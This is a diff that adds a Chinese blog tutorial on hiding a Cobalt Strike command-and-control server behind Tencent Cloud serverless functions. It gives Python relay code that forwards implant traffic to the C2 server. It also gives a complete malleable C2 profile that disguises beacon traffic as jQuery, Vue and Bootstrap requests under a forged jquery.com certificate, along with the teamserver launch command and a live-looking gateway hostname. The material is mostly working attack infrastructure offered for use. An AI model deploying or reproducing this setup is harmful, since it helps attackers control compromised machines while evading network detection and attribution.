@@ -141,6 +141,89 @@
 <p>注册腾讯云账号<br>vps一台<br>cs（我用的4.3）<br>1、登陆腾讯云控制台，输入云函数</p>
 <img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p1.png" class="" title="p1">
 
+
+
+<p>2、新建函数服务</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p2.png" class="" title="p2">
+
+
+
+<p>3、函数名称随意，选择从头开始，环境填Python3.6，选完后下拉，把代码搞里头。</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p3.png" class="" title="p3">
+
+
+
+<p>4、打码的地方填vps的地址（代码在下面），填完点完成，后会弹出一个提示框点击 留在此页面</p>
+<p>C2地址的地方少掉了一个单引号，当时测试的时候也是一直不上线，最后排查的时候找到了。</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p4.png" class="" title="p4">
+
+
+
+<ul>
+<li>云函数的Python代码</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    C2=<span class="string">&#x27;http://&lt;C2服务器地址&gt;&#x27;</span> <span class="comment"># 这里可以使用 HTTP、HTTPS~下角标~</span></span><br><span class="line">    path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">    headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">        resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.headers)</span><br><span class="line">        <span class="built_in">print</span>(resp.content)</span><br><span class="line"></span><br><span class="line">    response=&#123;</span><br><span class="line">        <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">        <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">        <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+
+
+
+<p>5、点击触发管理，创建触发器</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p5.png" class="" title="p5">
+
+
+
+<p>6、配置如下，点击提交</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p6.png" class="" title="p6">
+
+
+
+<p>7、点击api服务名</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p7.png" class="" title="p7">
+
+
+
+<p>8、点击编辑后到达此页面，路径修改为&#x2F; ，点击下一步</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p8.png" class="" title="p8">
+
+
+
+<p>9、配置如下 点击完成 后点击 发布服务</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p9.png" class="" title="p9">
+
+
+
+<p>10、配置cs的profile文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">set sample_name &quot;kris_abao&quot;;</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36&quot;;</span><br><span class="line"></span><br><span class="line">https-certificate </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    set keystore &quot;cobaltStrike.store&quot;; //生成的cs证书名</span><br><span class="line">    set password &quot;123456&quot;;    //自己设置的密码</span><br><span class="line"></span><br><span class="line">    ## Option 3) Cobalt Strike Self-Signed Certificate</span><br><span class="line">    set C   &quot;US&quot;;</span><br><span class="line">    set CN  &quot;jquery.com&quot;;</span><br><span class="line">    set O   &quot;jQuery&quot;;</span><br><span class="line">    set OU  &quot;Certificate Authority&quot;;</span><br><span class="line">    set validity &quot;365&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-get </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;/api/getit&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;SESSIONID=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager </span><br><span class="line">&#123;  </span><br><span class="line">    set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class="line">    set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    set uri &quot;/api/postit&quot;;</span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">        id &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;JSESSION=&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server </span><br><span class="line">    &#123;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">        header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>11、开启cs teamserver .&#x2F;teamserver vpsip password c2.profile</p>
+<p>12、上线地址 需要去掉http:&#x2F;&#x2F; 和 :80</p>
+<p>取<code>service-miuk9icj-1309081727.bj.apigw.tencentcs.com</code></p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p10.png" class="" title="p10">
+
+
+
+
+
+<p>13、创建监听</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p11.png" class="" title="p11">
+
+
+
+<p>14、上线成功</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p12.png" class="" title="p12">
+
+
+
+<p>可以看到上线的地址就是腾讯云，成功隐藏c2服务器。配置完后可以自己<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=wireshark&spm=1001.2101.3001.7020">wireshark</a>抓包看一下被控机器是否再跟腾讯云的ip地址通信。</p>
+<img src="/2022/09/07/%E4%BA%91%E5%87%BD%E6%95%B0%E9%9A%90%E8%97%8Fc2%E6%9C%8D%E5%8A%A1%E5%99%A8/p13.png" class="" title="p13">
+
+
+
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>借鉴一下大佬的原理</p>
+<p>云函数隐藏C2原理<br>马 -&gt; 腾讯云函数api -&gt; py函数 -&gt; CS服务端</p>
+<p>CS马被执行后，流量直接走向腾讯云的api（也就是这一步达成了隐藏C2服务端的目的，腾讯地址，有腾讯的CDN），然后py函数会根据传入的流量作为中间人对CS服务端进行请求，并获取返回结果后返回请求获取的数据信息（py代码的请求内容和CS服务端加载的profile是相对应的，CS服务端根据py函数传入的数据来获取相关信息）</p>
+
       </section>
 
       
